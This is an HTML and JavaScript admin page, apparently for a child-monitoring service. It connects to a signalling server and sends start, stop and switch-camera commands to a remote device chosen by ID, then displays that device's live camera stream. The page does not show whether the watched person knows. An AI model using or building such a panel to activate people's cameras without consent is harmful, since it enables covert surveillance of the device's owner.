<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Live Camera Monitor</title>

<script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.5.4/socket.io.js"></script>

<style>
:root{
    --bg:#0f0f10;
    --panel:#1c1c1e;
    --green:#30d158;
    --red:#ff453a;
    --blue:#0a84ff;
}

body{
    margin:0;
    background:var(--bg); /* Background dark rahega */
    font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;
    display:flex;
    justify-content:center;
    align-items:center; /* Center align for Laptop */
    height: 100vh;
    height: 100dvh; /* Mobile Browser Bar Fix */
    overflow: hidden; 
}

.app{
    display:flex;
    flex-direction:column;
    background:#000;
    
    /* ðŸ”¥ LAPTOP VIEW SETTINGS (Yahan change kiya hai) ðŸ”¥ */
    width:100%;
    /* Pehle 420px tha, ab 800px kar diya taaki laptop pe bada dikhe */
    max-width: 800px; 
    height: 90vh; /* Screen ka 90% height lega */
    max-height: 900px;
    border-radius: 20px; /* Laptop pe rounded corners */
    box-shadow: 0 0 40px rgba(0,0,0,0.7); /* Shadow thoda aur heavy kiya */
    overflow: hidden;
    position: relative;
    border: 1px solid rgba(255,255,255,0.1);
}

/* ðŸ”¥ MOBILE SPECIFIC STYLES (Ye same hai, phone par koi change nahi) ðŸ”¥ */
@media (max-width: 500px) {
    body {
        background: #000;
        align-items: flex-start;
    }
    .app {
        max-width: 100%; /* Full Width */
        height: 100%; /* Full Height */
        max-height: none;
        border-radius: 0;
        border: none;
        box-shadow: none;
    }
}

/* HEADER */
.header{
    flex-shrink: 0; 
    padding:16px 20px;
    display:flex;
    justify-content:space-between;
    align-items:center;
    background: var(--panel); 
    color: white;
    z-index: 10;
}

.status{
    font-size:11px;
    padding:4px 12px;
    border-radius:20px;
    background:rgba(255, 69, 58, 0.2);
    color: var(--red);
    font-weight:700;
    letter-spacing: 0.5px;
    border: 1px solid var(--red);
}

.status.live{
    background:rgba(48, 209, 88, 0.2);
    color: var(--green);
    border: 1px solid var(--green);
}

/* VIDEO SECTION */
.video-box{
    flex:1; 
    background:black;
    display:flex;
    justify-content:center;
    align-items:center;
    overflow: hidden; 
    position: relative;
    width: 100%;
}

video{
    width:100%;
    height:100%;
    object-fit:contain; /* Video fit rahega, katega nahi */
}

/* CONTROLS */
.controls{
    flex-shrink: 0; 
    padding:20px;
    background:var(--panel);
    display:flex;
    gap:15px;
    /* Phone ke niche wale safe area ke liye padding */
    padding-bottom: max(20px, env(safe-area-inset-bottom)); 
}

.btn{
    flex:1;
    border:none;
    border-radius:14px;
    padding:16px 0;
    font-size:14px;
    font-weight:600;
    color:white;
    cursor:pointer;
    transition: transform 0.1s, opacity 0.2s;
    text-transform: uppercase;
    letter-spacing: 1px;
}

.btn:active {
    transform: scale(0.96);
    opacity: 0.8;
}

.start{ background:var(--green); color:#000; box-shadow: 0 4px 15px rgba(48, 209, 88, 0.3); }
.stop{ background:var(--red); color: white; box-shadow: 0 4px 15px rgba(255, 69, 58, 0.3); }
.switch{
    background:rgba(255,255,255,0.1);
    color: var(--blue);
    max-width:60px;
    font-size:20px;
}

</style>
</head>

<body>

<div class="app">

    <div class="header">
        <span style="font-weight: 600;">ðŸ“· Cam Monitor</span>
        <span id="status" class="status">OFFLINE</span>
    </div>

    <div class="video-box">
        <video id="remoteVideo" autoplay playsinline muted></video>
        <div id="placeholder" style="position:absolute; color:#333; font-size:12px;">Waiting for connection...</div>
    </div>

    <div class="controls">
        <button class="btn start" onclick="startCamera()">Start</button>
        <button class="btn switch" onclick="switchCamera()">ðŸ”„</button>
        <button class="btn stop" onclick="stopCamera()">Stop</button>
    </div>

</div>

<script>
/* ================= CONFIG ================= */

const SERVER = "https://child-v9no.onrender.com";

const params = new URLSearchParams(window.location.search);
let DEVICE_ID = params.get("id");

if(!DEVICE_ID){
    DEVICE_ID = localStorage.getItem("savedDeviceId");
}

if(!DEVICE_ID){
    // Optional: Prompt user instead of alert for better UI
    DEVICE_ID = prompt("Enter Device ID:", "");
    if(DEVICE_ID) localStorage.setItem("savedDeviceId", DEVICE_ID);
}

/* ================= WEBRTC ================= */

let socket;
let pc;

const config = {
    iceServers:[{ urls:"stun:stun.l.google.com:19302" }]
};

/* ================= SOCKET ================= */

socket = io(SERVER);

socket.on("connect", ()=>{
    console.log("Connected to Server");
    socket.emit("join-room","ADMIN");
});

/* ================= OFFER ================= */

socket.on("offer", async (data)=>{
    console.log("Offer received");
    document.getElementById("placeholder").style.display = "none"; // Hide text

    pc = new RTCPeerConnection(config);

    pc.ontrack = (event) => {
        const video = document.getElementById("remoteVideo");
        if (event.streams && event.streams[0]) {
            video.srcObject = event.streams[0];
        } else {
            const stream = new MediaStream();
            stream.addTrack(event.track);
            video.srcObject = stream;
        }
        video.play().catch(e => console.log("Auto-play blocked:", e));
        setStatus(true);
    };

    pc.onicecandidate = (e)=>{
        if(e.candidate){
            socket.emit("candidate",{
                target: DEVICE_ID,
                candidate: e.candidate.candidate,
                sdpMid: e.candidate.sdpMid,
                sdpMLineIndex: e.candidate.sdpMLineIndex
            });
        }
    };

    await pc.setRemoteDescription(new RTCSessionDescription({ type: "offer", sdp: data.sdp }));
    const ans = await pc.createAnswer();
    await pc.setLocalDescription(ans);

    socket.emit("answer",{ target: DEVICE_ID, sdp: ans.sdp });
});

/* ================= ICE ================= */

socket.on("candidate", async d=>{
    if(pc){
        await pc.addIceCandidate(new RTCIceCandidate({
            candidate: d.candidate,
            sdpMid: d.sdpMid,
            sdpMLineIndex: d.sdpMLineIndex
        }));
    }
});

/* ================= BUTTONS ================= */

function startCamera(){
    if(!DEVICE_ID) { alert("No Device ID!"); return; }
    console.log("Sending Start Command to: " + DEVICE_ID);
    socket.emit("send-command",{
        targetId: DEVICE_ID,
        command: "start_video"
    });
}

function stopCamera(){
    if(!DEVICE_ID) return;
    socket.emit("send-command",{
        targetId: DEVICE_ID,
        command: "stop_video"
    });

    const v = document.getElementById("remoteVideo");
    v.srcObject = null;
    document.getElementById("placeholder").style.display = "block"; // Show text back

    if(pc){
        pc.close();
        pc = null;
    }

    setStatus(false);
}

function switchCamera(){
    if(!DEVICE_ID) return;
    socket.emit("switch-camera",{ target: DEVICE_ID });
}

/* ================= UI ================= */

function setStatus(live){
    const s = document.getElementById("status");
    s.textContent = live ? "LIVE" : "OFFLINE";
    s.className = live ? "status live" : "status";
}
</script>

</body>
</html>
